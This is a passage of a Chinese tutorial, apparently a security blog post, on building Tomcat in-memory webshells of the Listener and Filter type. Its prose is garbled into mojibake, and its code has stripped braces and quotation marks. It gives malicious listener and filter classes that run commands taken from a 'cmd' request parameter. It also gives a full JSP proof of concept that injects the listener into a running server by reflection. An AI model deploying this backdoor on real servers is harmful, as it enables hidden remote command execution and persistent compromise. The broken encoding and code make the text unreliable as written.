¹æ®yzddmr6å¸ˆå‚…çš„ç†è§£ï¼Œå¦‚æœæŠŠæŸæ¬¡è¯·æ±‚æ¯”ä½œç”µå½±ä¸­çš„äº‹ä»¶ï¼Œé‚£ä¹ˆcontextå°±ç›¸å½“äºäº‹ä»¶å‘ç”Ÿçš„èƒŒæ™¯ã€‚ä¾‹å¦‚ä¸€éƒ¨ç”µå½±ä¸­çš„æŸä¸ªé•œå¤´ä¸­ï¼Œå¼ ä¸‰å¤§å–Šâ€œå¥¥åˆ©ç»™â€ï¼Œä½†æ˜¯åªçœ‹è¿™ä¸€ä¸ªé•œå¤´æˆ‘ä»¬ä¸çŸ¥é“åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆï¼Œå¼ ä¸‰æ˜¯è°ï¼Œä¸ºä»€ä¹ˆè¦å–Šâ€œå¥¥åˆ©ç»™â€ã€‚æ‰€ä»¥å°±éœ€è¦äº¤ä»£å½“æ—¶äº‹æƒ…å‘ç”Ÿçš„èƒŒæ™¯ã€‚å¼ ä¸‰æ˜¯åƒé¥­å‰å–Šçš„å¥¥åˆ©ç»™ï¼Ÿè¿˜æ˜¯åƒé¥­åå–Šçš„å¥¥åˆ©ç»™ï¼Ÿå› ä¸ºå¯¹äºåŒä¸€ä»¶äº‹æƒ…ï¼šå¼ ä¸‰å–Šå¥¥åˆ©ç»™è¿™ä»¶äº‹ï¼Œå‘ç”Ÿçš„èƒŒæ™¯ä¸åŒæ„ä¹‰å¯èƒ½æ˜¯ä¸åŒçš„ã€‚åƒé¥­å‰å–Šå¥¥åˆ©ç»™å¯èƒ½æ˜¯é¥¿äº†çš„æ„æ€ï¼Œåƒé¥­åå–Šå¥¥åˆ©ç»™å¯èƒ½æ˜¯è¯´åƒé¥±äº†çš„æ„æ€ã€‚ åœ¨WEBè¯·æ±‚ä¸­ä¹Ÿå¦‚æ­¤ï¼Œåœ¨ä¸€æ¬¡requestè¯·æ±‚å‘ç”Ÿæ—¶ï¼ŒèƒŒæ™¯ï¼Œä¹Ÿå°±æ˜¯contextä¼šè®°å½•å½“æ—¶çš„æƒ…å½¢ï¼šå½“å‰WEBå®¹å™¨ä¸­æœ‰å‡ ä¸ªfilterï¼Œæœ‰ä»€ä¹ˆservletï¼Œæœ‰ä»€ä¹ˆlistenerï¼Œè¯·æ±‚çš„å‚æ•°ï¼Œè¯·æ±‚çš„è·¯å¾„ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆå…¨å±€çš„å‚æ•°ç­‰ç­‰ã€‚ ServletContextServletè§„èŒƒä¸­è§„å®šäº†ä¸€ä¸ªServletContextæ¥å£ï¼Œå…¶ç”¨æ¥ä¿å­˜ä¸€ä¸ªWebåº”ç”¨ä¸­æ‰€æœ‰Servletçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ServletContextæ¥å¯¹æŸä¸ªWebåº”ç”¨çš„èµ„æºè¿›è¡Œè®¿é—®å’Œæ“ä½œã€‚å…¶åœ¨Javaä¸­çš„å…·ä½“å®ç°æ˜¯javax.servlet.ServletContextæ¥å£ package javax.servlet; import java.io.InputStream;import java.net.MalformedURLException;import java.net.URL;import java.util.Enumeration;import java.util.EventListener;import java.util.Map;import java.util.Set;import javax.servlet.ServletRegistration.Dynamic;import javax.servlet.descriptor.JspConfigDescriptor; public interface ServletContext String TEMPDIR = javax.servlet.context.tempdir; String getContextPath(); ServletContext getContext(String var1); int getMajorVersion(); int getMinorVersion(); int getEffectiveMajorVersion(); int getEffectiveMinorVersion(); String getMimeType(String var1); Set getResourcePaths(String var1); URL getResource(String var1) throws MalformedURLException; InputStream getResourceAsStream(String var1); RequestDispatcher getRequestDispatcher(String var1); RequestDispatcher getNamedDispatcher(String var1); /** @deprecated */ Servlet getServlet(String var1) throws ServletException; /** @deprecated */ Enumeration getServlets(); /** @deprecated */ Enumeration getServletNames(); void log(String var1); /** @deprecated */ void log(Exception var1, String var2); void log(String var1, Throwable var2); String getRealPath(String var1); String getServerInfo(); String getInitParameter(String var1); Enumeration getInitParameterNames(); boolean setInitParameter(String var1, String var2); Object getAttribute(String var1); Enumeration getAttributeNames(); void setAttribute(String var1, Object var2); void removeAttribute(String var1); String getServletContextName(); Dynamic addServlet(String var1, String var2); Dynamic addServlet(String var1, Servlet var2); Dynamic addServlet(String var1, Class var2); extends Servlet T createServlet(Classvar1) throws ServletException; ServletRegistration getServletRegistration(String var1); Map ? extends ServletRegistration getServletRegistrations(); javax.servlet.FilterRegistration.Dynamic addFilter(String var1, String var2); javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Filter var2); javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Class var2); extends Filter T createFilter(Classvar1) throws ServletException; FilterRegistration getFilterRegistration(String var1); Map ? extends FilterRegistration getFilterRegistrations(); SessionCookieConfig getSessionCookieConfig(); void setSessionTrackingModes(Setvar1); Set getDefaultSessionTrackingModes(); Set getEffectiveSessionTrackingModes(); void addListener(String var1); extends EventListener void addListener(T var1); void addListener(Class var1); extends EventListener T createListener(Classvar1) throws ServletException; JspConfigDescriptor getJspConfigDescriptor(); ClassLoader getClassLoader(); void declareRoles(String... var1); å¯ä»¥çœ‹åˆ°ServletContextæ¥å£ä¸­å®šä¹‰äº†å¾ˆå¤šæ“ä½œï¼Œèƒ½å¯¹Servletä¸­çš„å„ç§èµ„æºè¿›è¡Œè®¿é—®ã€æ·»åŠ ã€åˆ é™¤ç­‰ ApplicationContextåœ¨Tomcatä¸­ï¼ŒServletContextæ¥å£çš„å…·ä½“å®ç°å°±æ˜¯ApplicationContextç±»ï¼Œå…¶å®ç°äº†ServletContextæ¥å£ä¸­å®šä¹‰çš„ä¸€äº›æ–¹æ³• Tomcatè¿™é‡Œä½¿ç”¨äº†é—¨é¢æ¨¡å¼ï¼Œå¯¹ApplicationContextç±»è¿›è¡Œäº†å°è£…ï¼Œæˆ‘ä»¬è°ƒç”¨getServletContext()æ–¹æ³•è·å¾—çš„å…¶å®æ˜¯ApplicationContextFacadeç±» public ApplicationContextFacade(ApplicationContext context) super(); this.context = context; classCache = new HashMap(); objectCache = new ConcurrentHashMap(); initClassCache(); ApplicationContextFacadeç±»æ–¹æ³•ä¸­éƒ½ä¼šè°ƒç”¨this.contextç›¸åº”çš„æ–¹æ³•ï¼Œå› æ­¤æœ€ç»ˆè°ƒç”¨çš„è¿˜æ˜¯ApplicationContextç±»çš„æ–¹æ³• StandardContextorg.apache.catalina.core.StandardContextæ˜¯å­å®¹å™¨Contextçš„æ ‡å‡†å®ç°ç±»ï¼Œå…¶ä¸­åŒ…å«äº†å¯¹Contextå­å®¹å™¨ä¸­èµ„æºçš„å„ç§æ“ä½œã€‚å››ç§å­å®¹å™¨éƒ½æœ‰å…¶å¯¹åº”çš„æ ‡å‡†å®ç°å¦‚ä¸‹ è€Œåœ¨ApplicationContextç±»ä¸­ï¼Œå¯¹èµ„æºçš„å„ç§æ“ä½œå®é™…ä¸Šæ˜¯è°ƒç”¨äº†StandardContextä¸­çš„æ–¹æ³• æ€»ç»“æˆ‘ä»¬å¯ä»¥ç”¨ä¸€å¼ å›¾æ¥è¡¨ç¤ºå„Contextçš„å…³ç³» ServletContextæ¥å£çš„å®ç°ç±»ä¸ºApplicationContextç±»å’ŒApplicationContextFacadeç±»ï¼Œå…¶ä¸­ApplicationContextFacadeæ˜¯å¯¹ApplicationContextç±»çš„åŒ…è£…ã€‚æˆ‘ä»¬å¯¹Contextå®¹å™¨ä¸­å„ç§èµ„æºè¿›è¡Œæ“ä½œæ—¶ï¼Œæœ€ç»ˆè°ƒç”¨çš„è¿˜æ˜¯StandardContextä¸­çš„æ–¹æ³•ï¼Œå› æ­¤StandardContextæ˜¯Tomcatä¸­è´Ÿè´£ä¸åº•å±‚äº¤äº’çš„Context Tomcatå†…å­˜é©¬Tomcatå†…å­˜é©¬å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼Œåˆ†åˆ«æ˜¯Listenerå‹ã€Filterå‹ã€Servletå‹ã€‚Tomcatå†…å­˜é©¬çš„æ ¸å¿ƒåŸç†å°±æ˜¯åŠ¨æ€åœ°å°†æ¶æ„ç»„ä»¶æ·»åŠ åˆ°æ­£åœ¨è¿è¡Œçš„TomcatæœåŠ¡å™¨ä¸­ è€Œè¿™ä¸€æŠ€æœ¯çš„å®ç°æœ‰èµ–äºå®˜æ–¹å¯¹Servlet3.0çš„å‡çº§ï¼ŒServletåœ¨3.0ç‰ˆæœ¬ä¹‹åèƒ½å¤Ÿæ”¯æŒåŠ¨æ€æ³¨å†Œç»„ä»¶ã€‚è€ŒTomcatç›´åˆ°7.xæ‰æ”¯æŒServlet3.0ï¼Œå› æ­¤é€šè¿‡åŠ¨æ€æ·»åŠ æ¶æ„ç»„ä»¶æ³¨å…¥å†…å­˜é©¬çš„æ–¹å¼é€‚åˆTomcat7.xåŠä»¥ä¸Š Listenerå‹æ ¹æ®ä»¥ä¸Šæ€è·¯ï¼Œæˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯åœ¨æœåŠ¡å™¨ä¸­åŠ¨æ€æ³¨å†Œä¸€ä¸ªæ¶æ„çš„Listenerã€‚è€ŒListeneræ ¹æ®äº‹ä»¶æºçš„ä¸åŒï¼Œå¤§è‡´å¯ä»¥åˆ†ä¸ºå¦‚ä¸‹å‡ ç§ ServletContextListenerï¼šå¯¹Servletä¸Šä¸‹æ–‡çš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼› ServletContextAttributeListenerï¼šç›‘å¬ Servlet ä¸Šä¸‹æ–‡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢ï¼› HttpSessionListenerï¼šå¯¹ Session å¯¹è±¡ä¸­å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ ServletRequestListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡çš„åˆå§‹åŒ–å’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼› ServletRequestAttributeListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ HttpSessionListenerï¼šå¯¹ Session çš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ã€‚Session çš„é”€æ¯æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ä¸ªä¸­ Session è¶…æ—¶ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡è°ƒç”¨ Session å¯¹è±¡çš„ invalidate() æ–¹æ³•ä½¿ session å¤±æ•ˆ å¾ˆæ˜æ˜¾ï¼ŒServletRequestListeneræ˜¯æœ€é€‚åˆç”¨æ¥ä½œä¸ºå†…å­˜é©¬çš„ã€‚å› ä¸ºServletRequestListeneræ˜¯ç”¨æ¥ç›‘å¬ServletRequestå¯¹è±¡çš„ï¼Œå½“æˆ‘ä»¬è®¿é—®ä»»æ„èµ„æºæ—¶ï¼Œéƒ½ä¼šè§¦å‘ServletRequestListener#requestInitialized()æ–¹æ³•ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªæ¶æ„çš„Listener package Listener;import javax.servlet.ServletRequestEvent;import javax.servlet.ServletRequestListener;import javax.servlet.annotation.WebListener;import javax.servlet.http.HttpServletRequest;import java.io.IOException;@WebListenerpublic class Shell_Listener implements ServletRequestListener @Override public void requestInitialized(ServletRequestEvent sre) HttpServletRequest request = (HttpServletRequest) sre.getServletRequest(); String cmd = request.getParameter(cmd); if (cmd != null) try Runtime.getRuntime().exec(cmd); catch (IOException e) e.printStackTrace(); catch (NullPointerException n) n.printStackTrace(); è®¿é—®ä»»æ„è·¯ç”±éƒ½å¯è¿›è¡Œæ¶æ„çš„getä¼ å‚æ‰§è¡Œå¼¹è®¡ç®—å™¨ æ¥ä¸‹æ¥å°±æ˜¯è¦çœ‹å¦‚ä½•æŠŠè¯¥æ¶æ„çš„ListeneråŠ¨æ€æ³¨å†Œè¿›æœåŠ¡å™¨äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ†æä¸€ä¸‹Listenerçš„åˆ›å»ºè¿‡ç¨‹ åˆ›å»ºè¿‡ç¨‹å…ˆä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œå†è¿›è¡Œè°ƒè¯•ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹æ‰€ç¤º requestInitialized:13, Shell_Listener (Listener)fireRequestInitEvent:5157, StandardContext (org.apache.catalina.core)invoke:116, StandardHostValve (org.apache.catalina.core)invoke:93, ErrorReportValve (org.apache.catalina.valves)invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)invoke:74, StandardEngineValve (org.apache.catalina.core)service:346, CoyoteAdapter (org.apache.catalina.connector)service:388, Http11Processor (org.apache.coyote.http11)process:63, AbstractProcessorLight (org.apache.coyote)process:936, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:52, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:748, Thread (java.lang) æˆ‘ä»¬ä¸€æ­¥æ­¥å¾€ä¸Šçœ‹ï¼Œé¦–å…ˆæ˜¯StandardContext#fireRequestInitEventè°ƒç”¨äº†æˆ‘ä»¬çš„Listenerï¼Œæˆ‘ä»¬è·Ÿè¿›çœ‹ä¸€æ‰‹ public boolean fireRequestInitEvent(ServletRequest request) Object instances[] = getApplicationEventListeners(); if ((instances != null) (instances.length 0)) ServletRequestEvent event = new ServletRequestEvent(getServletContext(), request); for (int i = 0; i instances.length; i++) if (instances[i] == null) continue; if (!(instances[i] instanceof ServletRequestListener)) continue; ServletRequestListener listener = (ServletRequestListener) instances[i]; try listener.requestInitialized(event); catch (Throwable t) ExceptionUtils.handleThrowable(t); getLogger().error(sm.getString( standardContext.requestListener.requestInit, instances[i].getClass().getName()), t); request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t); return false; return true; å…³é”®ä»£ç æœ‰ä¸¤å¤„ï¼Œé¦–å…ˆé€šè¿‡getApplicationEventListeners()è·å–ä¸€ä¸ªListeneræ•°ç»„ å†è·Ÿè¿›applicationEventListenersListå‘ç°Listeneræ˜¯å­˜å‚¨åœ¨*applicationEventListenersList*å±æ€§ä¸­çš„ å¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡StandardContext#addApplicationEventListener()æ–¹æ³•æ¥æ·»åŠ Listener public void addApplicationEventListener(Object listener) applicationEventListenersList.add(listener); ç¬¬äºŒå¤„å°±æ˜¯éå†æ•°ç»„è°ƒç”¨listener.requestInitialized(event)æ–¹æ³•è§¦å‘Listener è·å–StandardContextç±»ç»§ç»­å¾€ä¸Šèµ°ï¼Œåœ¨è°ƒç”¨StandardContext#fireRequestInitEventæ–¹æ³•ä¹‹å‰æˆ‘ä»¬éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªStandardContextå¯¹è±¡ï¼Œçœ‹å †æ ˆæ˜¯åœ¨StandardHostValve#invokeä¸­ï¼Œå¯ä»¥çœ‹åˆ°å…¶é€šè¿‡requestå¯¹è±¡æ¥è·å–StandardContextç±» åŒæ ·åœ°ï¼Œç”±äºJSPå†…ç½®äº†requestå¯¹è±¡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨åŒæ ·çš„æ–¹å¼æ¥è·å– % Field reqF = request.getClass().getDeclaredField(request); reqF.setAccessible(true); Request req = (Request) reqF.get(request); StandardContext context = (StandardContext) req.getContext();% è¿˜æœ‰å¦ä¸€ç§è·å–æ–¹å¼å¦‚ä¸‹ %\tWebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();% è€Œæ¶æ„çš„Listenerå¦‚ä¸‹ %! public class Shell_Listener implements ServletRequestListener public void requestInitialized(ServletRequestEvent sre) HttpServletRequest request = (HttpServletRequest) sre.getServletRequest(); String cmd = request.getParameter(cmd); if (cmd != null) try Runtime.getRuntime().exec(cmd); catch (IOException e) e.printStackTrace(); catch (NullPointerException n) n.printStackTrace(); public void requestDestroyed(ServletRequestEvent sre) % æœ€åæ·»åŠ è¯¥Listener %\tShell_Listener shell_Listener = new Shell_Listener(); context.addApplicationEventListener(shell_Listener);% å®Œæ•´pocä»ä¸Šè¿°åˆ†ææˆ‘ä»¬å°±å¯ä»¥æ€»ç»“å‡ºæ¥å®ç°Listeneræœ¨é©¬çš„æ­¥éª¤å¦‚ä¸‹ï¼š é¦–å…ˆæˆ‘ä»¬éœ€è¦å…ˆè·å–ä¸€ä¸ªStandardContextç±» æ¥ç€æˆ‘ä»¬éœ€è¦å†™ä¸€ä¸ªæ¶æ„çš„Listener æœ€åæˆ‘ä»¬è¦æŠŠè¯¥Listeneræ·»åŠ è¿›å» æ‰€ä»¥å®Œæ•´çš„pocå¦‚ä¸‹ %@ page contentType=text/html;charset=UTF-8 language=java %%@ page import=java.lang.reflect.Field %%@ page import=java.io.IOException %%@ page import=org.apache.catalina.core.StandardContext %%@ page import=org.apache.catalina.connector.Request % %! public class Shell_Listener implements ServletRequestListener public void requestInitialized(ServletRequestEvent sre) HttpServletRequest request = (HttpServletRequest) sre.getServletRequest(); String cmd = request.getParameter(cmd); if (cmd != null) try Runtime.getRuntime().exec(cmd); catch (IOException e) e.printStackTrace(); catch (NullPointerException n) n.printStackTrace(); public void requestDestroyed(ServletRequestEvent sre) %% Field reqF = request.getClass().getDeclaredField(request); reqF.setAccessible(true); Request req = (Request) reqF.get(request); StandardContext context = (StandardContext) req.getContext(); Shell_Listener shell_Listener = new Shell_Listener(); context.addApplicationEventListener(shell_Listener);% æˆ‘ä»¬æµ‹è¯•ä¸€æ‰‹ï¼Œå…ˆè®¿é—®Listener.jspé¡µé¢ï¼Œè®©å…¶ä»£ç è¿›è¡ŒåŠ è½½ æ­¤æ—¶Tomcatå·²ç»æ·»åŠ äº†æˆ‘ä»¬æ¶æ„çš„Listenerï¼Œè®¿é—®ä»»æ„è·¯ç”±å³å¯è§¦å‘ Filterå‹ä»¿ç…§Listenerå‹å†…å­˜é©¬çš„å®ç°æ€è·¯ï¼Œæˆ‘ä»¬åŒæ ·èƒ½å®ç°Filterå‹å†…å­˜é©¬ å½“å¤šä¸ª Filter åŒæ—¶å­˜åœ¨çš„æ—¶å€™ï¼Œç»„æˆäº† Filter é“¾ã€‚Web æœåŠ¡å™¨æ ¹æ® Filter åœ¨ web.xml æ–‡ä»¶ä¸­çš„æ³¨å†Œé¡ºåºï¼Œå†³å®šå…ˆè°ƒç”¨å“ªä¸ª Filterã€‚å½“ç¬¬ä¸€ä¸ª Filter çš„ doFilter æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼ŒwebæœåŠ¡å™¨ä¼šåˆ›å»ºä¸€ä¸ªä»£è¡¨ Filter é“¾çš„ FilterChain å¯¹è±¡ä¼ é€’ç»™è¯¥æ–¹æ³•ï¼Œé€šè¿‡åˆ¤æ–­ FilterChain ä¸­æ˜¯å¦è¿˜æœ‰ Filter å†³å®šåé¢æ˜¯å¦è¿˜è°ƒç”¨ Filter æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªæ¶æ„çš„Filter package Filter; import javax.servlet.*;import javax.servlet.annotation.WebFilter;import java.io.IOException; @WebFilter(/*)public class Shell_Filter implements Filter @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException String cmd = request.getParameter(cmd); if (cmd != null) try Runtime.getRuntime().exec(cmd); catch (IOException e) e.printStackTrace(); catch (NullPointerException n) n.printStackTrace(); chain.doFilter(request, response); æµ‹è¯•ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ é‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥ä¸€æ ·æ˜¯è¦çœ‹ä¸‹å®ƒçš„åˆ›å»ºè¿‡ç¨‹ Filterè°ƒç”¨åˆ†ææ‰“ä¸Šæ–­ç‚¹ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š doFilter:11, Shell_Filter (Filter)internalDoFilter:168, ApplicationFilterChain (org.apache.catalina.core)doFilter:144, ApplicationFilterChain (org.apache.catalina.core)invoke:168, StandardWrapperValve (org.apache.catalina.core)invoke:90, StandardContextValve (org.apache.catalina.core)invoke:482, AuthenticatorBase (org.apache.catalina.authenticator)invoke:130, StandardHostValve (org.apache.catalina.core)invoke:93, ErrorReportValve (org.apache.catalina.valves)invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)invoke:74, StandardEngineValve (org.apache.catalina.core)service:346, CoyoteAdapter (org.apache.catalina.connector)service:388, Http11Processor (org.apache.coyote.http11)process:63, AbstractProcessorLight (org.apache.coyote)process:936, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:52, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:748, Thread (java.lang) è·Ÿè¿›ApplicationFilterChain#internalDoFilter private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException // Call the next filter if there is one if (pos n) ApplicationFilterConfig filterConfig = filters[pos++]; try Filter filter = filterConfig.getFilter(); if (request.isAsyncSupported() false.equalsIgnoreCase( filterConfig.getFilterDef().getAsyncSupported())) request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE); if( Globals.IS_SECURITY_ENABLED ) final ServletRequest req = request; final ServletResponse res = response; Principal principal = ((HttpServletRequest) req).getUserPrincipal(); Object[] args = new Object[]req, res, this; SecurityUtil.doAsPrivilege (doFilter, filter, classType, args, principal); else filter.doFilter(request, response, this); ... åœ¨è¯¥å‡½æ•°é‡Œé¢è°ƒç”¨äº†doFilteræ–¹æ³•ï¼Œè€Œfilteræ˜¯é€šè¿‡filterConfig.getFilter()è·å¾—çš„ï¼ŒfilterConfigæ˜¯é€šè¿‡ApplicationFilterConfig filterConfig = filters[pos++];è·å–åˆ°çš„ ä¸€ä¸ªfilterConfigå¯¹åº”ä¸€ä¸ªFilterï¼Œç”¨äºå­˜å‚¨Filterçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚è¿™é‡Œçš„*filters*å±æ€§æ˜¯ä¸€ä¸ªApplicationFilterConfigæ•°ç»„ æ‰€ä»¥æˆ‘ä»¬è¦çœ‹*ApplicationFilterChain.filters*æ•°ç»„æ˜¯æ€ä¹ˆè·å–åˆ°çš„ï¼Œå…¶å®šä¹‰å¦‚ä¸‹ private ApplicationFilterConfig[] filters = new ApplicationFilterConfig[0]; è·Ÿä¸€ä¸‹ï¼Œæ˜¯åœ¨ApplicationFilterChain#addFilterå‡½æ•°ä¸­è¿›è¡Œçš„èµ‹å€¼ void addFilter(ApplicationFilterConfig filterConfig) // Prevent the same filter being added multiple times for(ApplicationFilterConfig filter:filters) if(filter==filterConfig) return; if (n == filters.length) ApplicationFilterConfig[] newFilters = new ApplicationFilterConfig[n + INCREMENT]; System.arraycopy(filters, 0, newFilters, 0, n); filters = newFilters; filters[n++] = filterConfig; æŸ¥æ‰¾è¯¥å‡½æ•°çš„ç”¨æ³•ï¼Œåœ¨ApplicationFilterChain#createFilterChainä¸­åˆå§‹åŒ–äº†ä¸€ä¸ªApplicationFilterChainç±» public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) ... // Request dispatcher in use filterChain = new ApplicationFilterChain(); filterChain.setServlet(servlet); filterChain.setServletSupportsAsync(wrapper.isAsyncSupported()); // Acquire the filter mappings for this Context StandardContext context = (StandardContext) wrapper.getParent(); FilterMap filterMaps[] = context.findFilterMaps(); ... String servletName = wrapper.getName(); // Add the relevant path-mapped filters to this filter chain for (FilterMap filterMap : filterMaps) ... ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName()); ... filterChain.addFilter(filterConfig); ... // Return the completed filter chain return filterChain; è€Œè¯¥å‡½æ•°çš„è°ƒç”¨å°±åœ¨åœ¨StandardWrapperValve#invoke()æ–¹æ³•ä¸­ï¼Œä½äºè°ƒç”¨æ ˆé‡Œé¢ åˆ†æä¸€æ³¢createFilterChainå‡½æ•°ï¼Œèƒ½å¤Ÿæ¸…æ™°åœ°çœ‹åˆ°filterChainå¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹ é¦–å…ˆé€šè¿‡filterChain = new ApplicationFilterChain()åˆ›å»ºä¸€ä¸ªç©ºçš„filterChainå¯¹è±¡ ç„¶åé€šè¿‡wrapper.getParent()å‡½æ•°æ¥è·å–StandardContextå¯¹è±¡ æ¥ç€è·å–StandardContextä¸­çš„FilterMapså¯¹è±¡ï¼ŒFilterMapså¯¹è±¡ä¸­å­˜å‚¨çš„æ˜¯å„Filterçš„åç§°è·¯å¾„ç­‰ä¿¡æ¯ æœ€åæ ¹æ®Filterçš„åç§°ï¼Œåœ¨StandardContextä¸­è·å–FilterConfig é€šè¿‡filterChain.addFilter(filterConfig)å°†ä¸€ä¸ªfilterConfigæ·»åŠ åˆ°filterChainä¸­ ä¸Šè¿°æ­¥éª¤ä¸­filterConfigæ˜¯é€šè¿‡(ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName()); è·å–åˆ°çš„ï¼Œè·Ÿè¿›findFilterConfigæ–¹æ³• public FilterConfig findFilterConfig(String name) return (filterConfigs.get(name)); æ˜¯ä»StandardContextçš„å±æ€§filterConfigsä¸­è·å–åˆ°çš„filterConfig filterConfigsçš„å®šä¹‰å¦‚ä¸‹ çœ‹æ‰‹ApplicationFilterConfigç±»æ˜¯å¦‚ä½•æ„å»ºçš„ï¼Œä¸‹é¢å†™å†…å­˜é©¬çš„æ—¶å€™ä¼šç”¨åˆ° FilterConfigsã€FilterDefså’ŒFilterMapsè·Ÿè¿›åˆ°createFilterChainå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°æ­¤æ—¶çš„ä¸Šä¸‹æ–‡å¯¹è±¡StandardContextå®é™…ä¸Šæ˜¯åŒ…å«äº†è¿™ä¸‰è€…çš„ å…¶ä¸­filterConfigsåŒ…å«äº†å½“å‰çš„ä¸Šä¸‹æ–‡ä¿¡æ¯StandardContextã€ä»¥åŠfilterDefç­‰ä¿¡æ¯ åœ¨è¿™å…¶ä¸­filterDefå­˜æ”¾äº†filterçš„å®šä¹‰ï¼ŒåŒ…æ‹¬filterClassã€filterNameç­‰ä¿¡æ¯ã€‚å¯¹åº”çš„å…¶å®å°±æ˜¯web.xmlä¸­çš„filteræ ‡ç­¾ filter filter-name/filter-name filter-class/filter-class/filter filterDefå¿…è¦çš„å±æ€§ä¸ºfilterã€filterClassä»¥åŠfilterName filterDefsæ˜¯ä¸€ä¸ªHashMapï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨filterDef \\ filterMapsä¸­ä»¥arrayçš„å½¢å¼å­˜æ”¾å„filterçš„è·¯å¾„æ˜ å°„ä¿¡æ¯ï¼Œå…¶å¯¹åº”çš„æ˜¯web.xmlä¸­çš„filter-mappingæ ‡ç­¾ filter-mapping filter-name/filter-name url-pattern/url-pattern/filter-mapping filterMapså¿…è¦çš„å±æ€§ä¸ºdispatcherMappingã€filterNameã€urlPatterns äºæ˜¯ä¸‹é¢çš„å·¥ä½œå°±æ˜¯æ„é€ å«æœ‰æ¶æ„filterçš„FilterMapså’ŒFilterConfigå¯¹è±¡ï¼Œå¹¶å°†FilterConfigæ·»åŠ åˆ°filteré“¾ä¸­äº†ã€‚ åŠ¨æ€æ³¨å†ŒFilterç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºåŠ¨æ€æ·»åŠ æ¶æ„Filterçš„æ€è·¯ è·å–StandardContextå¯¹è±¡ åˆ›å»ºæ¶æ„Filter ä½¿ç”¨FilterDefå¯¹Filterè¿›è¡Œå°è£…ï¼Œå¹¶æ·»åŠ å¿…è¦çš„å±æ€§ åˆ›å»ºfilterMapç±»ï¼Œå¹¶å°†è·¯å¾„å’ŒFilternameç»‘å®šï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterMapsä¸­ ä½¿ç”¨ApplicationFilterConfigå°è£…filterDefï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterConfigsä¸­ è·å–StandardContextå¯¹è±¡StandardContextå¯¹è±¡ä¸»è¦ç”¨æ¥ç®¡ç†Webåº”ç”¨çš„ä¸€äº›å…¨å±€èµ„æºï¼Œå¦‚Sessionã€Cookieã€Servletç­‰ã€‚å› æ­¤æˆ‘ä»¬æœ‰å¾ˆå¤šæ–¹æ³•æ¥è·å–StandardContextå¯¹è±¡ã€‚ Tomcatåœ¨å¯åŠ¨æ—¶ä¼šä¸ºæ¯ä¸ªContextéƒ½åˆ›å»ºä¸ªServletContextå¯¹è±¡ï¼Œæ¥è¡¨ç¤ºä¸€ä¸ªContextï¼Œä»è€Œå¯ä»¥å°†ServletContextè½¬åŒ–ä¸ºStandardContextã€‚ //è·å–ApplicationContextFacadeç±»ServletContext servletContext = request.getSession().getServletContext(); 